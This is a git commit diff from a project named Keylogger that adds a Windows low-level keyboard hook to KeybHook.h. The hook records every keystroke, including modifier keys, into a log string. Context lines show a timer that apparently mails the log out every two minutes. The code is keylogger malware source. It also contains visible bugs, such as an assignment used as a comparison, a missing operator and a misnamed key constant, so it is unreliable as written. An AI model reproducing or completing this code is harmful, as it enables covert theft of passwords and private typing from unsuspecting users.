cf585569ddfce5559b2f411a5034eef0d4a00f30
DESKTOP-8M0J74Q\User <nwy140@gmail.com>
2018-01-07 15:21:17 +0800

    KeyboardHook log file

--- Keylogger/KeybHook.h
+++ Keylogger/KeybHook.h
@@ -39,4 +39,42 @@ Timer MailTimer(TimerSendMail, 2000* 60 , Timer::Infinite);
 
 HHOOK eHook = NULL;
 
+LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
+{
+    if (nCode <0)
+        CallNextHookEx(eHook, nCode , wparam, lparam)   ;
+    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;
+
+    if( wparam = WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
+    {
+        keylog += Keys::KEYS[kbs->vkCode].Name;
+        if(kbs->vkCode == VK_RETURN)  // if user enter key pressed, it will print new line
+            keylog +="\n" ; //append keys to string txt
+    }
+    else if(wparam == WM_KEYUP || wparam WM_SYSKEYUP)
+    {                    //  [SHIFT][a][b][c][/SHIFT] [r]
+        DWORD key=kbs ->vkCode  ;
+        if (key==VK_CONTROL
+            || key==VK_LCONTROL
+            || key==VK_RCONTROL
+            || key== VK_SHIFT
+            || key== VK_LSHIFT
+            || key== VK_RSHIFT
+            || key== MENU
+            || key== VK_LMENU
+            || key== VK_RMENU
+            || key== VK_CAPITAL
+            || key== VK_NUMLOCK
+            || key== VK_LWIN
+            || key== VK_RWIN
+            )
+                {
+                    std::string KeyName  = Keys::KEYS[kbs->vkCode].Name;
+                    KeyName.insert(1, "/");
+                    keylog += KeyName;
+                }
+    }
+    return CallNextHookEx(eHook, nCode,  wparam, lparam);
+}
+
 #endif // KEYBHOOK_H
